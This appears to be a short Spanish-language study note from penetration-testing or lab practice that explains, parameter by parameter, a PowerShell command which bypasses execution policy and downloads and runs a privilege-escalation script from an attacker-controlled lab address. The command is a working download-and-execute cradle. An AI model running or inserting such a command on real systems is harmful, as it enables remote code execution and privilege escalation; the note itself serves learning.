
```
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://10.10.16.12/Invoke-MS16032.ps1')"
```

*Parametros*:
	`-ep` Es executionPolicy
		`bypass` Permite que powershell ejecute scripts sin respetar la politica de ejecucion del sistema, por que widnwos puede bloquear scripts no firmados y bypass evita este bloqueo
	`-c` Es la abreviación de commando
		`iex` Ejecuta el contenido descargado
		`DownloadString` Descarga el archivo
		`(New-Object Net.WebClient)` Crea un objeto de powershell que puede descargar datos desde URLS